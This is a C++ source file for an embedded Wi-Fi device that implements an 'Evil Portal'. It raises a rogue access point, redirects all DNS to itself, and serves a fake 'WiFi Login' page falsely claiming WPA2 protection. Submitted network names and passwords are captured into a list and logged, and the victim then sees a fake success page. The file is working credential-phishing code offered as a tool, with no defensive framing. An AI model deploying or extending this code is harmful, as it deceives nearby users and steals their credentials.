#include "evil_portal.h"

// Default HTML template stored in PROGMEM
const char PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WiFi Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
            padding: 40px 30px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #667eea;
            font-size: 28px;
            margin-bottom: 5px;
        }
        .logo p {
            color: #888;
            font-size: 14px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #333;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 15px;
            transition: border-color 0.3s;
        }
        input[type="text"]:focus,
        input[type="password"]:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        button:active {
            transform: translateY(0);
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #888;
            font-size: 12px;
        }
        .error {
            background: #fee;
            color: #c33;
            padding: 10px;
            border-radius: 6px;
            margin-bottom: 20px;
            font-size: 14px;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>🔒 WiFi Login</h1>
            <p>Enter your credentials to connect</p>
        </div>
        <div id="error" class="error"></div>
        <form action="/post" method="POST" id="loginForm">
            <div class="form-group">
                <label for="ssid">Network Name (SSID)</label>
                <input type="text" id="ssid" name="ssid" placeholder="Enter SSID" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter password" required>
            </div>
            <button type="submit">Connect</button>
        </form>
        <div class="footer">
            <p>Secure connection • Protected by WPA2</p>
        </div>
    </div>
</body>
</html>
)rawliteral";

// Global instance
EvilPortalManager evilPortal;

// Constructor
EvilPortalManager::EvilPortalManager() 
    : webServer(nullptr), dnsServer(nullptr), active(false), totalCaptured(0) {
}

// Destructor
EvilPortalManager::~EvilPortalManager() {
    end();
}

// Initialize Evil Portal
bool EvilPortalManager::begin(const char* ssid, uint8_t channel) {
    DEBUG_PRINTLN("[Portal] Initializing Evil Portal...");
    
    apName = String(ssid);
    apChannel = channel;
    
    // Create server instances
    webServer = new AsyncWebServer(WEB_SERVER_PORT);
    dnsServer = new DNSServer();
    
    // Load HTML
    htmlPage = String(PORTAL_HTML);
    
    // Start AP
    startAP();
    
    // Setup DNS
    setupDNS();
    
    // Setup web routes
    setupRoutes();
    
    // Start servers
    webServer->begin();
    dnsServer->start(DNS_PORT, "*", WiFi.softAPIP());
    
    active = true;
    
    DEBUG_PRINTLN("[Portal] Evil Portal started");
    DEBUG_PRINT("[Portal] SSID: ");
    DEBUG_PRINTLN(apName);
    DEBUG_PRINT("[Portal] IP: ");
    DEBUG_PRINTLN(WiFi.softAPIP());
    
    return true;
}

// Stop Evil Portal
void EvilPortalManager::end() {
    if (!active) return;
    
    DEBUG_PRINTLN("[Portal] Stopping Evil Portal...");
    
    if (webServer) {
        webServer->end();
        delete webServer;
        webServer = nullptr;
    }
    
    if (dnsServer) {
        dnsServer->stop();
        delete dnsServer;
        dnsServer = nullptr;
    }
    
    stopAP();
    active = false;
    
    DEBUG_PRINTLN("[Portal] Evil Portal stopped");
}

// Start Access Point
void EvilPortalManager::startAP() {
    WiFi.mode(WIFI_MODE_AP);
    WiFi.softAP(apName.c_str(), PORTAL_PASSWORD, apChannel, 0, PORTAL_MAX_CONNECTIONS);
    
    // Configure IP
    IPAddress local_ip(192, 168, 4, 1);
    IPAddress gateway(192, 168, 4, 1);
    IPAddress subnet(255, 255, 255, 0);
    WiFi.softAPConfig(local_ip, gateway, subnet);
    
    delay(100);
}

// Stop Access Point
void EvilPortalManager::stopAP() {
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_MODE_NULL);
}

// Setup DNS for captive portal
void EvilPortalManager::setupDNS() {
    // DNS will redirect all requests to our IP
}

// Setup web server routes
void EvilPortalManager::setupRoutes() {
    // Root handler
    webServer->on("/", HTTP_GET, [this](AsyncWebServerRequest* request) {
        handleRoot(request);
    });
    
    // POST handler for credentials
    webServer->on("/post", HTTP_POST, [this](AsyncWebServerRequest* request) {
        handlePost(request);
    });
    
    // Catch-all handler for captive portal
    webServer->onNotFound([this](AsyncWebServerRequest* request) {
        handleNotFound(request);
    });
}

// Handle root request
void EvilPortalManager::handleRoot(AsyncWebServerRequest* request) {
    DEBUG_PRINTLN("[Portal] Root request");
    request->send(200, "text/html", htmlPage);
}

// Handle POST request (credentials)
void EvilPortalManager::handlePost(AsyncWebServerRequest* request) {
    DEBUG_PRINTLN("[Portal] POST request received");
    
    String ssid = "";
    String password = "";
    
    // Get parameters
    if (request->hasParam("ssid", true)) {
        ssid = request->getParam("ssid", true)->value();
    }
    if (request->hasParam("password", true)) {
        password = request->getParam("password", true)->value();
    }
    
    // Save credentials
    if (ssid.length() > 0 && password.length() > 0) {
        String cred = "SSID: " + ssid + " | Pass: " + password;
        capturedCreds.push_back(cred);
        lastCred = cred;
        totalCaptured++;
        
        DEBUG_PRINTLN("[Portal] Credentials captured:");
        DEBUG_PRINTLN(cred);
    }
    
    // Send success page
    String successHTML = getSuccessHTML();
    request->send(200, "text/html", successHTML);
}

// Handle not found (redirect to root)
void EvilPortalManager::handleNotFound(AsyncWebServerRequest* request) {
    DEBUG_PRINT("[Portal] Redirect: ");
    DEBUG_PRINTLN(request->url());
    request->redirect("/");
}

// Get default HTML
String EvilPortalManager::getDefaultHTML() {
    return htmlPage;
}

// Get success HTML
String EvilPortalManager::getSuccessHTML() {
    return R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connected</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            max-width: 400px;
            width: 100%;
            padding: 40px 30px;
            text-align: center;
        }
        .checkmark {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: #11998e;
            margin: 0 auto 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
        }
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
        }
        p {
            color: #666;
            font-size: 16px;
            line-height: 1.5;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="checkmark">✓</div>
        <h1>Successfully Connected!</h1>
        <p>You are now connected to the network.</p>
        <p style="margin-top: 20px; font-size: 14px; color: #999;">
            You can close this window.
        </p>
    </div>
</body>
</html>
)rawliteral";
}

// Loop function (process DNS)
void EvilPortalManager::loop() {
    if (!active) return;
    dnsServer->processNextRequest();
}

// Get captured credentials count
int EvilPortalManager::getCapturedCredsCount() {
    return totalCaptured;
}

// Get last credential
String EvilPortalManager::getLastCredential() {
    return lastCred;
}

// Clear credentials
void EvilPortalManager::clearCredentials() {
    capturedCreds.clear();
    lastCred = "";
    totalCaptured = 0;
}

// Check if active
bool EvilPortalManager::isActive() {
    return active;
}

// Get client count
int EvilPortalManager::getClientCount() {
    return WiFi.softAPgetStationNum();
}
